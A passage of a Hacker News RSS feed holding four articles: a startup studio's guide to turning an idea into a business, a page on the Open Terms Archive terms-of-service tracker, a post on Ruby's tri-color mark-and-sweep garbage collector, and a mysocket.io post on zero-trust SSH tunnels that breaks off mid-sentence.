Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26183057">thread link</a>) | @davidkolodny
<br/>
February 18, 2021 | https://www.wilburlabs.com/blueprints/how-to-turn-an-idea-into-a-business | <a href="https://web.archive.org/web/*/https://www.wilburlabs.com/blueprints/how-to-turn-an-idea-into-a-business">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Turning an idea into a business can be one of the most fulfilling and rewarding challenges of a lifetime. It√¢‚Ç¨‚Ñ¢s not easy, but the skills and experiences required to start a business are learnable. </p><p>Great entrepreneurs are made, not born. Hard work, drive, and absolute determination can make up for gaps in skills and experience. The rest is learned by doing, making mistakes, and adapting along the way.</p><p>Wilbur Labs is a startup studio turning bold ideas into market-leading companies. Since 2016 we have launched and invested in 15 technology companies, including <a href="https://www.vacationrenter.com/">VacationRenter</a>, <a href="https://www.vitabox.com/">Vitabox</a>, <a href="https://www.joblist.com/">Joblist</a>, and <a href="https://www.barkbus.com/">Barkbus</a>. Today, our portfolio companies have hundreds of millions of users from around the world, and have generated billions of dollars in sales. We plan to launch several companies every year.</p><p>One question that we√¢‚Ç¨‚Ñ¢re constantly asked is: <br></p></div><h2>How do you turn an idea into a business?</h2><div><p>Launching a business is typically a one-time event. At Wilbur Labs, it√¢‚Ç¨‚Ñ¢s a repeatable and systematized process. Turning a bold idea into a business √¢‚Ç¨‚Äú over and over √¢‚Ç¨‚Äú is what we do. Over time, we have defined several critical steps that are key to effectively turn any idea into a business. We√¢‚Ç¨‚Ñ¢re sharing that playbook with you to help you on your journey.</p><p><em>Note: This guide assumes that you already have an idea for a business. Coming up with an idea for a company is a separate topic covered in our <a href="https://www.wilburlabs.com/blueprints/how-to-get-startup-ideas">How to Get Startup Ideas</a> Blueprint.</em></p></div><h2>Step 1: Research</h2><div><p>The research stage is where you pair your initial idea with independent and external information. This should include first-hand research, speaking with industry experts, and talking with target customers to answer key questions:</p><ul><li>What problem are you trying to solve? </li><li>How big is this problem?</li><li>How would this make people's lives better?</li><li>Why are the current solutions not optimal?</li><li>Who are the competitors?</li><li>What is the business model?</li><li>How big of a business could you build?</li><li>Are you the right person to solve this problem?</li><li>What advantages do you have in solving this problem?</li><li>Do you care about this enough to work on it for 5+ years?</li><li>What are the outstanding challenges or questions?</li></ul><p>During this stage, you should talk with as many people as possible. You will be surprised how many target customers and industry experts are receptive to cold outreach to discuss a business idea. We recommend using LinkedIn or Twitter to source experts who know the problem you are trying to solve, and ask if they√¢‚Ç¨‚Ñ¢re open to having a quick chat to discuss your idea. Many people passionate about an industry or a problem love talking with others who are equally as interested.</p><p>In addition to cold outreach, you should also use your personal network to reach out to any existing industry contacts who may be helpful √¢‚Ç¨‚Äú or know people who might be helpful √¢‚Ç¨‚Äú in researching this idea.</p><p>Be cautious about asking business advice from people close to you, because it√¢‚Ç¨‚Ñ¢s unlikely that you will get truly honest and critical feedback. Expect pushback because it√¢‚Ç¨‚Ñ¢s unlikely that everyone will love your idea, and that√¢‚Ç¨‚Ñ¢s okay. Some of our boldest ideas received mixed feedback in the beginning. The point here is that you hear multiple viewpoints and use feedback to guide your research and planning. </p><p>Make sure to go very deep on your research during this stage. Some of our ideas remain in this stage for 6 to 12 months. Ideas are easy and everyone has them. This stage helps filter out the so-so ideas to prevent you from wasting time in a later stage. Frontloading research and due diligence here can also reduce risk and expedite future stages.</p><p>The best business ideas will bring a sense of urgency and motivation, pushing you to keep moving forward. If you are able to gain significant momentum through research, it makes sense to move into the planning stage.</p></div><h2>Step 2: Plan</h2><div><p>In the planning stage you should focus on taking your learnings and creating an executable plan. This will require diving deeper into the areas you looked into during the research phase, as well as answering new questions.</p><p>At Wilbur Labs, we create a √¢‚Ç¨≈ìConcept Evaluation√¢‚Ç¨ÔøΩ which is our own version of a business plan. Whatever format you choose, it√¢‚Ç¨‚Ñ¢s important to have a written plan that organizes all your research into an actionable plan that looks at every angle of your idea.</p><p>We like to work backwards during this stage, thinking about how we want the business to look 3 to 5 years ahead and then build a roadmap to get there. In our Concept Evaluation, we answer a number of questions, including but not limited to:</p><ul><li>What does the product look like at launch, year 1, year 2, etc?</li><li>How will you get customers (marketing/distribution)? How much will it cost?</li><li>What are the sources of revenue?</li><li>What√¢‚Ç¨‚Ñ¢s the expected lifetime value of a customer?</li><li>How will you retain customers long term to boost lifetime value?</li><li>Where is the break-even point (cost) of this business?</li><li>Where is the break-even point (time) of this business?</li><li>How do you solve the challenges you identified in the research phase?</li><li>What initial investment is required to get this off the ground?</li><li>How much time will it take to get this off the ground?</li><li>What investment is required over the next 3-5 years?</li><li>What√¢‚Ç¨‚Ñ¢s the optimal funding source?</li><li>What partnership(s) will you need?</li><li>What type of infrastructure will this company need?</li><li>What team is needed to build and grow this business?</li><li>What advisors could you reach out to for help?</li></ul><p>In addition to answering the questions above, our Concept Evaluations also include a product roadmap/gantt chart, financial model, and start-up checklist.<strong><br></strong></p><h3><strong>Product Roadmap</strong></h3><p>The product roadmap and corresponding gantt chart provide a simple, but tangible way to look at the different work streams that will be a part of each phase of the business. The key here is to plan out dependencies, so you can parallel process and avoid bottlenecks.</p><p>You won√¢‚Ç¨‚Ñ¢t be able to do everything on day one. The important question to ask yourself during this planning stage is: what is the Minimum Viable Product (MVP) that you can launch with and how do you build on that MVP post launch? We are believers in launching as soon as possible to collect real customer feedback and use that to evolve the product along the way. <strong><br></strong></p><h3><strong>Financial Model</strong></h3><p>Our financial model is built using assumptions we find on our own, or inputs from industry experts. While this model is likely to change in the real world, we want to keep a close eye on the economics and the break even point. This is used to forecast the growth plan, timing, and investment level required. </p><p>Funding is a separate topic on its own and there is no universal best practice to finance a business. As an entrepreneur, you will need to look at a number of factors, including your personal situation, business cash requirements, and long term plan. It√¢‚Ç¨‚Ñ¢s worth spending time with advisors or mentors to discuss the best funding option for your situation. <strong><br></strong></p><h3><strong>Startup Checklist</strong></h3><p>We love checklists and have a checklist for everything. Checklists ensure consistency and completeness in carrying out a task. Checklists also allow you to frontload all the planning so you can focus on executing at the next stage. For our startup checklist, we include everything required to get from day zero to launch day. This includes corporate structuring and entity formation; legal and accounting prep; compliance, hiring, product building; distribution and marketing; operations, partnerships, and business development. We are extremely thorough and write out every critical task, corresponding notes, status, and owner.</p><p>Before moving on to the next stage you should ask yourself, <em>√¢‚Ç¨≈ìDo I want to spend the next 5+ years of my life building this business?√¢‚Ç¨ÔøΩ </em></p><p>More often than not, entrepreneurship is not a way to get rich quickly. You will likely need to work harder and longer, with higher stress and more at stake than working a regular day job. The journey is absolutely worth it for the right person, but it√¢‚Ç¨‚Ñ¢s important that you go into it knowing what to expect. Many companies die early due to missed expectations on what it takes to start a company. If possible, you can start out part-time and build traction before diving in full-time. </p><p>If you want to dedicate years of your life solving this problem, and building a business along the way, then move on to the execute phase.</p></div><h2>Step 3: Execute</h2><div><p>Every single person has ideas, but very few take the jump and start a company. The execution stage is where you leave the planning stage and take that jump. You have spent time researching, putting together a plan, and you are now ready to dedicate time to building a business.</p><p>Depending on the type of business, this stage will look very different. In all cases, this stage involves working through your plan, roadmap, and startup checklist to begin getting your idea off the ground. </p><p>The primary focus of this stage is prioritization. Prioritizing often will allow you to manage bottlenecks and work in parallel across different areas of your business. The goal is to align your input (time &amp; money) with the activities that will yield the highest output (progress on your plan). This is easier said than done, but it is absolutely critical to execute your plan in an efficient way.</p><p>If you need to raise money or get funding, this is the stage where that could happen. This is also the stage where you may need to start building your team by hiring contractors or employees. </p></div><h2>Step 4: Adapt</h2><div><p>Roughly 90% of businesses fail, and this is the stage where that usually happens. One thing√¢‚Ç¨‚Ñ¢s for certain in starting a business: you will never be able to create and follow a bulletproof plan. As your business takes off, you√¢‚Ç¨‚Ñ¢ll need to constantly adapt and change your plan. The best entrepreneurs are comfortable being uncomfortable, adapting as they go.</p><p>The optimal √¢‚Ç¨≈ìgo live√¢‚Ç¨ÔøΩ point will vary by business. At Wilbur Labs, we strongly believe that getting customers to vote for products and services with their wallet or with their time is by far the best measure of product-market fit. If customers won√¢‚Ç¨‚Ñ¢t spend time or money on your ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.wilburlabs.com/blueprints/how-to-turn-an-idea-into-a-business">https://www.wilburlabs.com/blueprints/how-to-turn-an-idea-into-a-business</a></em></p>]]>
            </description>
            <link>https://www.wilburlabs.com/blueprints/how-to-turn-an-idea-into-a-business</link>
            <guid isPermaLink="false">hacker-news-small-sites-26183057</guid>
            <pubDate>Thu, 18 Feb 2021 17:50:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Open Terms Archive: Terms and Conditions of popular services tracked on GitHub]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26182878">thread link</a>) | @sirffuzzylogik
<br/>
February 18, 2021 | https://disinfo.quaidorsay.fr/en/open-terms-archive | <a href="https://web.archive.org/web/*/https://disinfo.quaidorsay.fr/en/open-terms-archive">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<div class="page">
				<div>
					

<nav>
	<ol itemscope="" itemtype="https://schema.org/BreadcrumbList">
		<li itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem">	
			<a href="https://disinfo.quaidorsay.fr/en" itemprop="item">Home</a>
			
		</li>

		
			<li itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem">	
				<a href="https://disinfo.quaidorsay.fr/en/our-tools" itemprop="item">Our tools</a>
				
			</li>
		
		
		<li itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem">
			Open Terms Archive
		</li>
	</ol>
</nav>

<p><img src="https://disinfo.quaidorsay.fr/assets/img/open-terms-archive/thumb.jpg" alt=""></p>

<p>Services have terms that can change over time. Open Terms Archive enables users rights advocates, regulatory bodies and any interested citizen to <strong>follow the changes to these terms</strong>.</p>

<h3 id="follow-the-changes-to-the-terms-of-service">Follow the changes to the Terms of Service</h3>

<p>Services are declared within Open Terms Archive with a declaration file listing all the documents that, together, constitute <strong>the terms under which this service can be used</strong>. These documents all have a type, such as ‚Äúterms and conditions‚Äù, ‚Äúprivacy policy‚Äù, ‚Äúdeveloper agreement‚Äù.</p>

<p>The practices described regarding information manipulation can lead to a <strong>better understanding of the vulnerabilities</strong> of these actors and the transcription of legislative constraints, recommendations from public authorities or voluntary measures implemented enables us to <strong>appreciate their loyalty</strong>.</p>

<h3 id="case-studies">Case studies</h3>

<ul>
  <li>Google has changed its Review Guidelines to prohibit apps that hat mislead users by impersonating someone else or another app or falsely imply a relationship to another company / developer. These measures thus close certain vulnerabilities exploited for information manipulation. <a href="https://github.com/ambanum/CGUs-versions/commit/98f6c">See the change</a>.</li>
</ul>

<p><img src="https://disinfo.quaidorsay.fr/assets/img/open-terms-archive/google-case-studie.png" alt=""></p>

<ul>
  <li>TikTok refers to Comminuty Guidelines to offer its users the opportunity to report content that would be considered inappropriate. <a href="https://github.com/ambanum/CGUs-versions/commit/0d2f0386">See the change</a>.</li>
</ul>

<p><img src="https://disinfo.quaidorsay.fr/assets/img/open-terms-archive/tiktok-case-studie.png" alt=""></p>

<ul>
  <li>Google AdSense has changed its Acceptable Use Policy to add a reference to Coordinated Deceptive Practices to prohibit (i) practices that seek to coordinate with other sites or accounts and concealing or misrepresenting identity or other material details, when content relates to politics, social issues or matters of public concern and (ii) directe content about politics, social issues, or matters of public concern to users in a country other than one‚Äôs own, if you misrepresent or conceal one‚Äôs country of origin or other material details. <a href="https://github.com/ambanum/CGUs-versions/commit/c62b7">See the change</a>.</li>
</ul>

<p><img src="https://disinfo.quaidorsay.fr/assets/img/open-terms-archive/google-case-studie.png" alt=""></p>

<p><a href="https://github.com/ambanum/CGUs/wiki/%C3%89tudes-de-cas">Discover more case studies</a></p>

<h2 id="how-it-works">How it works</h2>

<p><em>Words in bold are <a href="https://en.wikipedia.org/wiki/Domain-driven_design">business domain names</a>.</em></p>

<p><strong>Services</strong> are <strong>declared</strong> within <em>Open Terms Archive</em> with a <strong>declaration file</strong> listing all the <strong>documents</strong> that, together, constitute the <strong>terms</strong> under which this <strong>service</strong> can be used. These <strong>documents</strong> all have a <strong>type</strong>, such as ‚Äúterms and conditions‚Äù, ‚Äúprivacy policy‚Äù, ‚Äúdeveloper agreement‚Äù‚Ä¶</p>

<p>In order to track their <strong>changes</strong>, <strong>documents</strong> are periodically obtained by fetching a web location and selecting content within the web page to remove the noise (ads, navigation menu, login fields‚Ä¶).</p>

<p>Anyone can run their own private instance and track changes on their own. However, we also publish each version on a <a href="https://github.com/ambanum/CGUs-versions"><strong>public</strong> instance</a> that makes it easy to explore the entire history and enables notifying over email whenever a new version is recorded.
Users can <a href="#be-notified"><strong>subscribe</strong> to <strong>notifications</strong></a>.</p>

<p><em>For now, when multiple versions coexist, <strong>terms</strong> are only <strong>tracked</strong> in their English version and for the European jurisdiction.</em></p>

<h3 id="exploring-the-versions-history">Exploring the versions history</h3>

<p>From the <strong>repository homepage</strong> <a href="https://github.com/ambanum/CGUs-versions">CGUs-versions</a>, open the folder of the service of your choice. You will see the set of documents tracked for that service, now click on the document of your choice. The latest version (updated hourly) will be displayed.</p>

<p><em>For more details, see our <a href="https://github.com/ambanum/CGUs#exploring-the-versions-history">wiki</a></em>.</p>

<h3 id="be-notified">Be notified</h3>

<p>You can <a href="https://59692a77.sibforms.com/serve/MUIEAKuTv3y67e27PkjAiw7UkHCn0qVrcD188cQb-ofHVBGpvdUWQ6EraZ5AIb6vJqz3L8LDvYhEzPb2SE6eGWP35zXrpwEFVJCpGuER9DKPBUrifKScpF_ENMqwE_OiOZ3FdCV2ra-TXQNxB2sTEL13Zj8HU7U0vbbeF7TnbFiW8gGbcOa5liqmMvw_rghnEB2htMQRCk6A3eyj">subscribe</a> to receive an email whenever a document is updated in the database.</p>

<p><strong>Beware, this service is in beta and you are likely to receive a large amount of notifications!</strong> You can unsubscribe by replying to any email you will receive.</p>

<p><em>For more details, see our <a href="https://github.com/ambanum/CGUs#be-notified">wiki</a></em>.</p>

<h2 id="scripta-manent">Scripta Manent</h2>

<p>Scripta Manent lists 637 Terms of Services (in French, Conditions G√©n√©rales d‚ÄôUtilisation or CGU) and legal documents coming from 174 digital service providers and gives simple tools to compare changes between two dates of your choice.</p>

<p><a href="https://disinfo.quaidorsay.fr/en/open-terms-archive/scripta-manent">Compare</a></p>

<h2 id="experiments">Experiments</h2>

<p>Experiments are ongoing so as to produce use cases using Open Terms Archive data.</p>

<p><a href="https://disinfo.quaidorsay.fr/en/open-terms-archive/experiments">See ours experiments</a></p>

<h2 id="api">API</h2>

<p>An API endpoint to find specific terms in the Open Terms Archive dataset is available.</p>

<p><a href="https://disinfo.quaidorsay.fr/api/open-terms-archive/">Access the API</a></p>

<h2 id="contributing">Contributing</h2>

<p>The tool is built as an <strong>open source and collaborative software</strong>, which means that everyone can contribute to its improvement and to the addition of documents and service providers to be tracked.</p>

<ul>
  <li>
    <p>Terms of Service Didn‚Äôt Read (ToSDR)
The association Terms of Service Didn‚Äôt Read (ToSDR) had developed a similar tool, <a href="https://tosback.org/">TOSBack</a> and thus transferred its resources and documents followed for several years to our tool.</p>
  </li>
  <li>
    <p>Direction G√©n√©rale des Entreprises<br>
The Direction G√©n√©rale des Entreprises (DGE), through the Digital Regulation Expertise Center (PEReN), contributes to the tool by developing new functionalities, such as tracking images and documents in PDF format.</p>
  </li>
</ul>

<div>
	<h3>Help us to improve Open Terms Archive</h3>
	<p>You can add service providers or documents that you would like to follow or suggest ways to add value to the case studies.</p>
	<p><a href="https://github.com/ambanum/CGUs">Contribute</a>
</p></div>

				</div>
			</div>
		</div></div>]]>
            </description>
            <link>https://disinfo.quaidorsay.fr/en/open-terms-archive</link>
            <guid isPermaLink="false">hacker-news-small-sites-26182878</guid>
            <pubDate>Thu, 18 Feb 2021 17:37:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ruby Garbage Collection Deep Dive: Tri-Color Mark and Sweep]]>
            </title>
            <description>
<![CDATA[
Score 137 | Comments 15 (<a href="https://news.ycombinator.com/item?id=26182796">thread link</a>) | @mooreds
<br/>
February 18, 2021 | https://jemma.dev/blog/gc-mark-and-sweep | <a href="https://web.archive.org/web/*/https://jemma.dev/blog/gc-mark-and-sweep">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>In the <a href="https://jemma.dev/blog/gc-internal">first post</a> in the Ruby Garbage Collection Deep Dive series, we went through a few definitions to give us a picture of how Ruby stores values in memory. If you haven‚Äôt read it yet, <a href="https://jemma.dev/blog/gc-internal">read it first</a>! We‚Äôll build on those definitions in this post. Particularly, we‚Äôll talk more about the Ruby Heap, Pages, Slots and RVALUES.</p>

<p>Okay, now that we have those baseline definitions out of the way, this post is going to explain the algorithm Ruby‚Äôs garbage collector uses to determine which objects it can collect: the Tri-Color Mark and Sweep algorithm. There are two phases to this algorithm. You guessed it: marking and sweeping. In the marking phase, the garbage collector marks all slots which contain accessible RVALUES. In the sweeping phase, the garbage collector clears the RVALUES out of all slots which are not marked. Let‚Äôs dig in!</p>

<h2 id="tri-color-mark-and-sweep">Tri-Color Mark and Sweep</h2>

<h3 id="marking">Marking</h3>

<p>We‚Äôll start off by discussing the marking phase. This is most straightforward to understand if we imagine the <a href="https://ruby-doc.org/core-3.0.0/ObjectSpace.html">Ruby ObjectSpace</a> to be a directed graph with root nodes. All of the nodes in the graphs are RVALUES. All of the edges in the graph are references from one RVALUE to another.</p>

<p>Ruby‚Äôs garbage collector starts at the root nodes and traces every edge it can access from these root nodes, marking every RVALUE it sees through this process. At the end, any RVALUE which was not traced, and therefore not accessible from a root RVALUE will be garbage collected.</p>

<h4 id="tri-color">Tri-Color</h4>

<p>Okay, but the algorithm Ruby uses for garbage collection is called a Tri-Color Mark and Sweep algorithm, so what‚Äôs the Tri-Color part all about? The Tri-Color algorithm is a model we can use to understand what Ruby‚Äôs garbage collector is doing, and how tracks its progress. The three colors in the Tri-Color algorithm (three shades, really) are white, black and grey.</p>

<p>At the beginning of garbage collection, every slot in the Ruby Heap is white. Then, as part of the initial setup, all slots which contain root RVALUEs are marked as grey.</p>

<p>Root RVALUES are all of the RVALUES that a Ruby program knows it will need to run. Examples of these are RVALUES that exist on the stack of instructions that the program is following, or protected global variables.</p>

<p>With all root slots grey, and all other slots white, we then get to the crux of the algorithm:</p>

<div><div><pre><code><span>while</span> <span>(</span><span>!</span><span>grey_slots</span><span>.</span><span>empty?</span><span>)</span>
  <span>current_slot</span> <span>=</span> <span>grey_slots</span><span>.</span><span>pop</span>
  <span>grey_slots</span> <span>+=</span> <span>current_slot</span><span>.</span><span>referenced_slots</span>
  <span>black_slots</span> <span>&lt;&lt;</span> <span>current_slot</span>
<span>end</span>
</code></pre></div></div>

<p>We iterate over all grey slots, coloring the slots that their RVALUES reference grey, and coloring themselves black. The algorithm continues until there are no grey slots left. At this point, any black slots contain RVALUES which were reachable by the RVALUEs in the root slots, and any white slots do not contain RVALUES which were reachable so can be swept away!</p>

<p>For the visual learners, here‚Äôs a gif of what the algorithm is doing:</p>

<p><img src="https://jemma.dev/assets/mark.gif" alt="mark-gif"></p>

<h4 id="references">References</h4>

<p>There is one detail which needs further explanation here: how does an RVALUE know which other RVALUES it references?</p>

<p>It depends on the type of object. For Ruby builtins, tracing the references are just baked into the garbage collector code itself. For example, to find all references from an array RVALUE, the collector iterates each element in the array and finds its references. For a hash, it will do this for both the keys and the values. This all happens in the garbage collector‚Äôs <a href="https://github.com/ruby/ruby/blob/296a2cab07ce530809ee74dee61180fbb3ca6f91/gc.c#L6269"><code>mark_children</code></a> method.</p>

<p>But, when objects are defined by C extensions, the C extensions must mark all child objects on their own. We‚Äôll dive more into this in a future C extensions post (which I‚Äôll backlink here).</p>

<p>Okay, so now that we understand how we find all accessbile objects, we need to learn how to dispose of all unaccessible objects.</p>

<h3 id="sweeping">Sweeping</h3>

<p>At this point, we have two sets: black slots and white slots. Internally, these are represented as a <code>marked</code> bitmap. Every Page on the Ruby Heap has its own <code>marked</code> bitmap with one bit per slot. A <code>1</code> bit means the slot is accessible, or Black in our Tri-Color scheme. A <code>0</code> bit means that the slot is no longer accessible, or White in our Tri-Color scheme.</p>

<p>In addition to holding this <code>marked</code> bitmap, each page also has a <code>freelist</code> which represents slots on that page which do not have live objects. The garbage collector iterates over all pages, finding all slots which are not marked. Where applicable, the garbage collector then adds the unmarked slots to each page‚Äôs freelist. If the RVALUES which were occupying these slots are also taking up space in the operating system heap, it also frees this memory.</p>

<p>Once pages have been swept, there might be pages which are now completely unallocated; they have no slots which contain RVALUES. These pages are referred to as ‚ÄúTomb Pages.‚Äù Tomb pages have their memory completely returned to the operating system‚Äôs heap. This is really helpful for memory management. It means that sweeping can result in freeing memory, or diminishing the overall size of the Ruby Heap.</p>

<p>Any pages with at least one occupied slot are called ‚ÄúEden Pages‚Äù. The sweeping phase might reduce the number of occupied slots in an Eden Page. The garbage collector will use the freelists from Eden Pages for future object allocations. That is to say, if you instantiate an object, the garbage collector will look for one of these free slots in an Eden Page and place the RVALUE representing your object in there.</p>

<p><img src="https://jemma.dev/assets/eden-and-tomb.png" alt="eden-and-tomb"></p>

<p>There is one more nuance here. As of Ruby 3.0, if auto-compaction is enabled, compaction will actually happen as part of the sweeping phase. A more in depth explanation of how and why this happens will follow in a later post about compaction in this Garbage Collection Deep Dive Series.</p>

<h3 id="tldr">TL;DR</h3>

<p>The Tri-Color mark and sweep algorithm is what Ruby‚Äôs garbage collector uses to determine which slots hold objects which no longer have accessible references. It marks all of the slots it has references to by following the Tri-Color algorithm in which it follows all references from root RVALUES. Once the garbage collector knows which objects are accessible from the roots, it can begin the sweep phase, where it will add the unoccupied slots to each page‚Äôs freelist, and release any operating system memory those RVALUES held. This enables the slots to be reused for new object allocation.</p>

<p>Here are a few new definitions we learned:</p>

<ul>
  <li><strong>Eden page</strong>: A page which contains slots with RVALUES, might also have empty slots</li>
  <li><strong>Tomb page</strong>: A page which contains only empty slots</li>
  <li><strong>Free list</strong>: A linked list per Heap Page of empty slots</li>
</ul>

<p>And that‚Äôs it for this post! I‚Äôm going to continue writing blog posts in this series, and am also writing a book about managed garbage collection, with a focus on Ruby. If this interests you, join the newsletter below or follow me <a href="https://twitter.com/jemmaissroff">on twitter</a> for updates!</p>


  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://jemma.dev/blog/gc-mark-and-sweep</link>
            <guid isPermaLink="false">hacker-news-small-sites-26182796</guid>
            <pubDate>Thu, 18 Feb 2021 17:32:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SSH zero trust and Identity aware TCP sockets]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26182574">thread link</a>) | @bgpdude
<br/>
February 18, 2021 | https://www.mysocket.io/post/introducing-ssh-zero-trust-identity-aware-tcp-sockets | <a href="https://web.archive.org/web/*/https://www.mysocket.io/post/introducing-ssh-zero-trust-identity-aware-tcp-sockets">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.17.5"><div dir="ltr"><div><blockquote id="viewer-foo"><span>In this article, we'll look at Mysocket's zero-trust <strong><em>cloud-delivered, authenticating firewall. </em></strong><em>Allowing</em><strong><em> </em></strong>you<strong><em> to replace your trusted IP ranges with trusted identities.</em></strong></span></blockquote><p id="viewer-5nqh3"><span>Last month we introduced our first zero trust features by introducing the concept of <em>Identity Aware Sockets</em>. It‚Äôs been great to see folks giving this a spin and start using it as a remote access alternative for the traditional VPN. </span></p><p id="viewer-fer1e"><span>Most services out there today are HTTP based, typically served over HTTPS. However, there are a few other commonly used services that are not HTTP based and, as a result, up until today, didn‚Äôt benefit from our identity-aware sockets. In this article, we‚Äôll introduce Zero trust support for non-HTTP based service, with the introduction Identity aware TCP sockets. Specifically, we‚Äôll look at providing zero trust services for SSH as an example.</span></p><h2 id="viewer-f7q8k"><span>Determining the user‚Äôs identity, authentication, and authorization</span></h2><p id="viewer-7aaq0"><span>Turning your mysocket services into an identity-aware socket is as simple as adding the‚Ää‚Äî‚Ääcloud_authentication flag to mysocketctl when creating the service. While doing so, you have the ability to add a list of email domains and/or a list of email addresses. Now each time a user tries to access your service, a browser will pop up asking the user to authenticate. Once authentication is finished, we know the user‚Äôs identity, and if that identity matches the list of authorized users, only then will the user be let through.</span></p><div id="viewer-8qt08"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.mysocket.io/post/introducing-ssh-zero-trust-identity-aware-tcp-sockets" data-pin-media="https://static.wixstatic.com/media/3b930f_6d1a7f0ff700466a8c76794820ad9d07~mv2.png/v1/fit/w_1000%2Ch_788%2Cal_c/file.png" src="https://static.wixstatic.com/media/3b930f_6d1a7f0ff700466a8c76794820ad9d07~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-dik4f"><span><em>Creating an Identity-aware TCP socket</em></span></p><p id="viewer-547m1"><span>If you think about what is happening here, you‚Äôll realize that what we have here is a <strong><em>per session, authenticating firewall</em></strong>. Only after the user is authenticated and authorized do we allow the network traffic through. Notice that this is much more advanced than your traditional firewall; now, <strong>every network flow has an identity</strong>. That‚Äôs powerful!</span></p><p id="viewer-3aeq1"><span>This flow of redirecting users to authenticate and then back to the service was do-able because it‚Äôs done in the browser and largely built of HTTP session management. Now we‚Äôd like to extend this with non-HTTP services, so we‚Äôll need to find an alternative for the HTTP session part. 
The solution for this comes with the help of Mutual TLS (MTLS). MTLS forces the client to authenticate itself when talking to the server. This is achieved by presenting a signed client certificate to the server. </span></p><h2 id="viewer-5u1ae"><span>Identity aware TCP sockets</span></h2><p id="viewer-70lha"><span>With the introduction of identity-aware TCP sockets, the mysocket edge proxies act as an authenticating firewall. Since we are relying on client TLS certificates, all traffic is securely tunneled over a TLS connection. </span></p><p id="viewer-bj4d7"><span>As you can see in the flow below, there are a few actions to take before the user can get through. To make this a seamless experience for the users of your service, we‚Äôve extended the mysocketctl command-line tool with the required functionality that kicks of the authentication flow. It starts the authentication process; after that, it requests a client certificate (your ticket in), and then it sets up the TLS tunnel for you. After that, users can send traffic over this authenticated and encrypted tunnel. In its simplest form, it will look something like this:</span></p><pre id="viewer-flnpc"><span>echo <span>"hello"</span> <span>|</span> mysocketctl client tls \
  <span>--</span>host muddy<span>-</span>pond<span>-</span><span>7106.</span>edge<span>.</span>mysocket<span>.</span>io </span></pre><p id="viewer-13s5a"><span>In the example above, we‚Äôre sending the string hello, to the service served by muddy-pond-7106.edge.mysocket.io. </span></p><div id="viewer-f4os0"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.mysocket.io/post/introducing-ssh-zero-trust-identity-aware-tcp-sockets" data-pin-media="https://static.wixstatic.com/media/3b930f_c2866a82888c4a62b9a8bab0e9f92473~mv2.png/v1/fit/w_1000%2Ch_934%2Cal_c/file.png" src="https://static.wixstatic.com/media/3b930f_c2866a82888c4a62b9a8bab0e9f92473~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-3ga6i"><span><em>Traffic flow</em></span></p><p id="viewer-1bp5o"><span>Before the string ‚Äúhello‚Äù arrives at the service protected by mysocket, the mysocketctl client will take care of the authentication flow, requests the TLS client certificate, and sends whatever comes in over stdin to the mysocket edge services.</span></p><h2 id="viewer-a30pl"><span>SSH zero trust</span></h2><p id="viewer-a007o"><span>Now that we understand the high-level flow let‚Äôs look at a more practical example. In this example, we have a server for which I‚Äôd like to make the SSH service available to only a subset of users. The ssh is on a private network such as your corporate network, your home network, or even in a private VPC or just firewalled off from the Internet.</span></p><p id="viewer-etkl7"><span>First, we‚Äôll provision the service using mysocketctl on the server-side and set up the tunnel.</span></p><pre id="viewer-7qh2i"><span>mysocketctl connect \
  --name 'remote access for my ssh server' \
  --cloudauth \
  --allowed_email_addresses'<a href="mailto:contractor@gmail.com" target="_blank" rel="noopener">contractor@gmail.com</a> \
  --allowed_email_domains 'mycorp.com' \
  --port 22 --host localhost \
  --type tls</span></pre><p id="viewer-7eojd"><span>In this example, I'm creating a mysocket service of type TLS, and we enable cloud authentication. This will force the user to present a valid client TLS certificate. The certificate can only ever be handed out to users that authenticate with a mycorp.com email address or using the specific email addresses contractor@gmail.com. </span></p><p id="viewer-fspee"><span>The same command will also set up a secure tunnel to the closest mysocket tunnel servers and expose the ssh service running on port 22. </span></p><div id="viewer-38v9c"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.mysocket.io/post/introducing-ssh-zero-trust-identity-aware-tcp-sockets" data-pin-media="https://static.wixstatic.com/media/3b930f_beee2579d42c444e9691f335223bec3c~mv2.png/v1/fit/w_1000%2Ch_1000%2Cal_c/file.png" src="https://static.wixstatic.com/media/3b930f_beee2579d42c444e9691f335223bec3c~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-cptfu"><span>The result is that this SSH service is now accessible to allowed users only, as crimson-thunder-8434.edge.mysocket.io:38676 
